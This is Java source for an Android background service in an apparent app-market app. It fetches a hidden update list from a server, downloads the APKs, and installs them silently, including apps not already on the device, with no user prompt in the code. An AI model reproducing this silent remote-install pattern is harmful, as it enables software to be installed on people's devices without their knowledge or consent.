package com.xyt.app.silentupgrade;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import net.tsz.afinal.http.AjaxCallBack;

import com.xyt.app_market.app.MyApp;
import com.xyt.app_market.contants.Constants;
import com.xyt.app_market.contants.Constants.DataConstant;
import com.xyt.app_market.contants.Constants.HandleWat_Constant;
import com.xyt.app_market.contants.Constants.TypeConstant;
import com.xyt.app_market.contants.Constants.URLConstant;
import com.xyt.app_market.dowload.DowloadService;
import com.xyt.app_market.dowload.DowdloadData;
import com.xyt.app_market.dowload.DowloadDialog;
import com.xyt.app_market.dowload.DownloadFile;
import com.xyt.app_market.entity.APPEntity;
import com.xyt.app_market.interfacs.DowloadContentValue;
import com.xyt.app_market.layout.DownGridLayout;
import com.xyt.app_market.utitl.HttpUtitl;
import com.xyt.app_market.utitl.Tools;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.ResolveInfo;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;

public class UpgradeService extends Service  {
	public static String TAG = UpgradeService.class.getSimpleName();
	public static List<APPEntity> hadiLists=new ArrayList<APPEntity>();
	private  static  List<Data> downThreep=new ArrayList<Data>();
	private 	List<ResolveInfo> resolveInfos ;
	class  Data{
		public	String url;
		public	String name;
		public	String packname;
		public Data(String url, String name, String packname) {
			super();
			this.url = url;
			this.name = name;
			this.packname = packname;
		}

	}
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		GetHideUpdate();
		MyApp.MLog(TAG, "onStart");
		super.onCreate();
	}
	public void GetHideUpdate(){
		HttpUtitl.GetTypeData(true,handler, 0, TypeConstant.HIDE_Type, 0, 	10);
	}
	Handler handler =new Handler(){
		public void handleMessage(android.os.Message msg) {
			switch (msg.what) {
			case HandleWat_Constant.successwhat:
				MyApp.MLog(TAG, "hadiLists=="+hadiLists.toString());
				SetDownThreep();
				MyApp.MLog(TAG, "downThreep=="+downThreep.toString());
				startTask();
				break ;
				}
		};
	};
	public void SetDownThreep(){
		if (hadiLists.size()==0) {
			return;
		}
		resolveInfos= Tools.loadApps(MyApp.getApp());
		for (int j = 0; j < hadiLists.size(); j++) {
			APPEntity appEntity=hadiLists.get(j);
			String packname =appEntity.getPackagename();
			long vercode =appEntity.getVersioncode();
			if (!TextUtils.isEmpty(packname)&&vercode>0) {
				boolean installTag=CheckNative(packname, vercode);
				if (installTag) {
					Data data =new Data(appEntity.getFilepath(), appEntity.getName(),packname);
					downThreep.add(data);
				}
			}
		}
	}
	public boolean CheckNative(String packname,long vercode){
		for (int i = 0; i < resolveInfos.size(); i++) {
			ResolveInfo resolveInfo = resolveInfos.get(i);
			String mpackname = resolveInfo.activityInfo.packageName;
			PackageInfo pkg = Tools.getPackageInfo(packname);
				if (packname.endsWith(mpackname)) {
					if (vercode>pkg.versionCode) {
						return true;
					}else {
						return false;
					}
				}
			}
		return true;
	}
	public void startTask(){
		if (downThreep.size()==0) {
			return;
		}
		final Data downdata=downThreep.get(0);
		File file = new File(Constants.DOWN_PATH, downdata.name+".apk");
		if (file.exists()) {
			file.delete();
		}
		String urlpath = URLConstant.URL_APP +downdata.url;
		DownloadFile downloadFile = new DownloadFile();
		downloadFile.startDownloadFileByUrl(urlpath, file.getAbsolutePath(),
				new AjaxCallBack<File>() {
					@Override
					public void onStart() {
						// TODO Auto-generated method stub
						MyApp.MLog(TAG, "开始下载"+downdata.name);
						super.onStart();
					}
					@Override
					public void onLoading(long count, long current) {
						// TODO Auto-generated method stub
						super.onLoading(count, current);
					}
					@Override
					public void onSuccess( File file) {
						// TODO Auto-generated method stub
						MyApp.MLog(TAG, "下载成功"+downdata.name);
						installAPk(file,downdata.packname);
						downThreep.remove(downdata);
						super.onSuccess(file);
					}

					@Override
					public void onFailure(Throwable t, String strMsg) {
						// TODO Auto-generated method stub
						MyApp.MLog(TAG, "下载失败"+downdata.name);
						Data faildata=downdata;
						downThreep.remove(downdata);
						downThreep.add(faildata);
					}
				});
	}
	public void installAPk(final File file, final String packname){
		new Thread(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				MyApp.MLog(TAG, "安装"+Tools.BackstageinstallApk(MyApp.getApp(), file.getAbsolutePath(),packname));
			}
		}).start();
	}
}
